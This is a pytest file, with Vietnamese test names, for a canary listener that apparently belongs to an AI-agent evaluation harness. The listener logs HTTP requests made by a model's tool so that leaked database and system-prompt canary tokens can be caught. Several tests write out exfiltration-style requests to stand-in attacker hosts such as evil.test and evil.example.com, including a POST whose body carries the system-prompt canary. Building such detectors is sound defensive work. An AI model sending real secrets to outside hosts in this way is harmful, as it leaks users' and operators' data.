"""Canary listener (STT-34).

Hai nhóm: test trên `TestClient` (không cần mạng), và test tích hợp chạy uvicorn trong thread rồi cho
`http_request` thật chuyển request tới — kiểm hit mang đúng token run của `seeded_run`.
"""

import base64
import socket
import threading
import time
from dataclasses import replace
from pathlib import Path

import pytest
import uvicorn
from fastapi.testclient import TestClient

from eval.canary import new_run_canaries
from obs.canary_listener import (
    MAX_BODY_BYTES,
    ORIGINAL_URL_HEADER,
    RUN_HEADER,
    HitStore,
    create_app,
    fetch_hits,
)
from tools.http_request import HttpConfig, HttpRequest
from tools.registry import ToolRegistry

FWD = {ORIGINAL_URL_HEADER: "http://evil.test/x"}


@pytest.fixture
def client(tmp_path: Path):
    app = create_app(tmp_path / "hits.db")
    with TestClient(app) as c:
        yield c, app.state.store


def test_ghi_du_truong(client):
    c, store = client
    r = c.post(
        "/collect/CANARY_DB_abc?d=1",
        content="công nợ CANARY_DB_abc".encode(),
        headers={**FWD, RUN_HEADER: "run-1", "Content-Type": "text/plain; charset=utf-8"},
    )
    assert r.status_code == 200 and r.json() == {"ok": True}
    [hit] = store.list()
    assert hit.run_token == "run-1"
    assert (hit.method, hit.path, hit.query) == ("POST", "/collect/CANARY_DB_abc", "d=1")
    assert hit.original_url == "http://evil.test/x"
    assert hit.body == "công nợ CANARY_DB_abc" and hit.body_encoding == "utf-8"
    assert hit.headers[RUN_HEADER.lower()] == "run-1"
    assert hit.client_ip and hit.received_at.endswith("+00:00")


def test_path_query_giu_percent_encoding(client):
    c, store = client
    c.get("/Nam%20Ph%C3%A1t?q=c%C3%B4ng%20n%E1%BB%A3", headers=FWD)
    [hit] = store.list()
    assert hit.path == "/Nam%20Ph%C3%A1t" and hit.query == "q=c%C3%B4ng%20n%E1%BB%A3"


def test_original_url_go_percent_encoding_cua_header(client):
    c, store = client
    c.get("/x", headers={ORIGINAL_URL_HEADER: "http://x.vn/Nam%20Ph%C3%A1t"})
    assert store.list()[0].original_url == "http://x.vn/Nam Phát"


@pytest.mark.parametrize("method", ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
def test_bat_moi_method_ke_ca_get_co_body(client, method):
    c, store = client
    c.request(method, "/a/b/c", content=b"payload", headers=FWD)
    [hit] = store.list()
    assert hit.method == method and hit.body == "payload"


def test_body_khong_phai_utf8_luu_base64(client):
    c, store = client
    raw = b"\xff\xfeCANARY"
    c.post("/x", content=raw, headers=FWD)
    [hit] = store.list()
    assert hit.body_encoding == "base64" and base64.b64decode(hit.body) == raw


def test_body_qua_lon_bi_cat_co_co(client):
    c, store = client
    c.post("/x", content=b"a" * (MAX_BODY_BYTES + 10), headers=FWD)
    [hit] = store.list()
    assert hit.body_truncated is True and len(hit.body) == MAX_BODY_BYTES


def test_hits_loc_theo_run_va_khong_tu_ghi(client):
    c, store = client
    c.get("/a", headers={**FWD, RUN_HEADER: "run-1"})
    c.get("/b", headers={**FWD, RUN_HEADER: "run-2"})
    c.get("/c", headers=FWD)
    assert [h["path"] for h in c.get("/hits").json()] == ["/a", "/b", "/c"]
    assert [h["path"] for h in c.get("/hits", params={"run": "run-2"}).json()] == ["/b"]
    assert len(store.list()) == 3  # đọc /hits không sinh hit mới


def test_hits_loc_theo_since(client):
    c, store = client
    c.get("/a", headers=FWD)
    cut = store.list()[0].received_at
    time.sleep(0.01)
    c.get("/b", headers=FWD)
    later = [h for h in store.list() if h.path == "/b"][0].received_at
    assert [h["path"] for h in c.get("/hits", params={"since": later}).json()] == ["/b"]
    assert len(c.get("/hits", params={"since": cut}).json()) == 2


def test_request_chuyen_toi_den_path_hits_van_la_hit(client):
    # Model viết http://evil.test/hits: có X-Original-URL nên ghi thành hit, không lộ hit run khác.
    c, store = client
    c.get("/a", headers={**FWD, RUN_HEADER: "run-khac"})
    r = c.get("/hits", headers={**FWD, RUN_HEADER: "run-1"})
    assert r.json() == {"ok": True}
    r = c.delete("/hits", headers={**FWD, RUN_HEADER: "run-1"})
    assert r.json() == {"ok": True}
    assert [h.path for h in store.list()] == ["/a", "/hits", "/hits"]


def test_delete_hits_theo_run(client):
    c, store = client
    c.get("/a", headers={**FWD, RUN_HEADER: "run-1"})
    c.get("/b", headers={**FWD, RUN_HEADER: "run-2"})
    assert c.delete("/hits", params={"run": "run-1"}).json() == {"deleted": 1}
    assert [h.run_token for h in store.list()] == ["run-2"]
    assert c.delete("/hits").json() == {"deleted": 1}
    assert store.list() == []


def test_healthz_va_method_quan_tri_sai(client):
    c, store = client
    assert c.get("/healthz").json() == {"ok": True}
    assert c.post("/hits").status_code == 405
    assert store.list() == []


def test_request_khong_header_toi_path_la_van_ghi(client):
    c, store = client
    c.get("/la")
    [hit] = store.list()
    assert hit.run_token is None and hit.original_url is None


def test_store_mo_lai_giu_du_lieu(tmp_path):
    db = tmp_path / "sub" / "hits.db"
    HitStore(db).record(
        method="GET", path="/x", query="", headers={}, body=b"", client_ip=None
    )
    assert [h.path for h in HitStore(db).list()] == ["/x"]


# ---------------------------------------------------------------------------
# Tích hợp: http_request thật → listener uvicorn trong thread
# ---------------------------------------------------------------------------


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture
def live_listener(tmp_path: Path):
    port = _free_port()
    server = uvicorn.Server(
        uvicorn.Config(create_app(tmp_path / "hits.db"), port=port, log_level="error")
    )
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    deadline = time.monotonic() + 10
    while not server.started:
        if time.monotonic() > deadline:
            raise RuntimeError("listener không khởi động")
        time.sleep(0.05)
    yield f"http://127.0.0.1:{port}"
    server.should_exit = True
    thread.join(timeout=5)


def test_http_request_toi_listener_mang_token_run(live_listener):
    reg = ToolRegistry()
    cfg = HttpConfig.from_params(reg.params("http_request"), env={})
    http = HttpRequest(replace(cfg, external_sink_url=live_listener))
    canaries = new_run_canaries()
    http.set_run(canaries.run_id)
    target = f"http://evil.example.com/c/{canaries.db}?d=Nam Phát"
    r = http({"method": "POST", "url": target, "body": f"rò {canaries.sysprompt}"})
    assert r.meta["sink"] == {"delivered": True, "status": 200}

    [hit] = fetch_hits(live_listener, canaries.run_id)
    assert hit.original_url == target
    assert hit.path == f"/c/{canaries.db}" and hit.query == "d=Nam%20Ph%C3%A1t"
    assert hit.body == f"rò {canaries.sysprompt}"

    http.set_run(None)
    http({"method": "GET", "url": "http://evil.example.com/khong-run"})
    assert len(fetch_hits(live_listener)) == 2
    assert len(fetch_hits(live_listener, canaries.run_id)) == 1
